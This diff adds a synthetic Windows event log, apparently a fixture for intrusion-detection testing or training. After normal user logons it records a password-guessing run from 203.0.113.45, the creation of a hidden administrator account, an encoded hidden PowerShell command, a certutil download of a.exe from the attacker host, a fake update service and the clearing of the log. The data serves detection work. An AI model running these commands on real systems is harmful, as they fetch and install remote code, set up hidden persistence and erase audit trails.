@@ -1,0 +1,32 @@
+{"EventID": 4624, "TimeCreated": "2026-11-18T08:05:00", "Data": {"TargetUserName": "priya", "LogonType": "2", "IpAddress": "-"}}
+{"EventID": 4624, "TimeCreated": "2026-11-18T08:20:00", "Data": {"TargetUserName": "rahul", "LogonType": "3", "IpAddress": "10.10.2.15"}}
+{"EventID": 4624, "TimeCreated": "2026-11-18T09:05:00", "Data": {"TargetUserName": "priya", "LogonType": "2", "IpAddress": "-"}}
+{"EventID": 4624, "TimeCreated": "2026-11-18T09:20:00", "Data": {"TargetUserName": "rahul", "LogonType": "3", "IpAddress": "10.10.2.15"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T09:40:00", "Data": {"TargetUserName": "rahul", "LogonType": "2", "IpAddress": "10.10.2.15"}}
+{"EventID": 7045, "TimeCreated": "2026-11-18T10:00:00", "Data": {"ServiceName": "Spooler", "ImagePath": "C:\\Windows\\System32\\spoolsv.exe"}}
+{"EventID": 4624, "TimeCreated": "2026-11-18T10:05:00", "Data": {"TargetUserName": "priya", "LogonType": "2", "IpAddress": "-"}}
+{"EventID": 4688, "TimeCreated": "2026-11-18T10:10:00", "Data": {"SubjectUserName": "priya", "CommandLine": "notepad.exe report.txt"}}
+{"EventID": 4624, "TimeCreated": "2026-11-18T10:20:00", "Data": {"TargetUserName": "rahul", "LogonType": "3", "IpAddress": "10.10.2.15"}}
+{"EventID": 4624, "TimeCreated": "2026-11-18T11:05:00", "Data": {"TargetUserName": "priya", "LogonType": "2", "IpAddress": "-"}}
+{"EventID": 4624, "TimeCreated": "2026-11-18T11:20:00", "Data": {"TargetUserName": "rahul", "LogonType": "3", "IpAddress": "10.10.2.15"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:01:10", "Data": {"TargetUserName": "admin", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:01:15", "Data": {"TargetUserName": "svc_sql", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:01:20", "Data": {"TargetUserName": "guest", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:02:11", "Data": {"TargetUserName": "admin", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:02:16", "Data": {"TargetUserName": "priya", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:02:21", "Data": {"TargetUserName": "guest", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:03:12", "Data": {"TargetUserName": "backup", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:03:17", "Data": {"TargetUserName": "priya", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:04:08", "Data": {"TargetUserName": "administrator", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:04:13", "Data": {"TargetUserName": "backup", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:04:18", "Data": {"TargetUserName": "rahul", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:05:09", "Data": {"TargetUserName": "administrator", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:05:14", "Data": {"TargetUserName": "svc_sql", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4625, "TimeCreated": "2026-11-18T13:05:19", "Data": {"TargetUserName": "rahul", "LogonType": "3", "IpAddress": "203.0.113.45"}}
+{"EventID": 4624, "TimeCreated": "2026-11-18T13:20:10", "Data": {"TargetUserName": "backup", "LogonType": "10", "IpAddress": "203.0.113.45"}}
+{"EventID": 4720, "TimeCreated": "2026-11-18T13:24:00", "Data": {"TargetUserName": "support$admin", "SubjectUserName": "backup"}}
+{"EventID": 4732, "TimeCreated": "2026-11-18T13:25:00", "Data": {"MemberName": "support$admin", "GroupName": "Administrators", "SubjectUserName": "backup"}}
+{"EventID": 4688, "TimeCreated": "2026-11-18T13:27:00", "Data": {"SubjectUserName": "backup", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"}}
+{"EventID": 4688, "TimeCreated": "2026-11-18T13:28:30", "Data": {"SubjectUserName": "backup", "CommandLine": "certutil -urlcache -f http://203.0.113.45/a.exe C:\\Users\\Public\\a.exe"}}
+{"EventID": 7045, "TimeCreated": "2026-11-18T13:30:00", "Data": {"ServiceName": "WinUpdateSvc", "ImagePath": "C:\\Users\\Public\\a.exe"}}
+{"EventID": 1102, "TimeCreated": "2026-11-18T13:40:00", "Data": {"SubjectUserName": "backup"}}
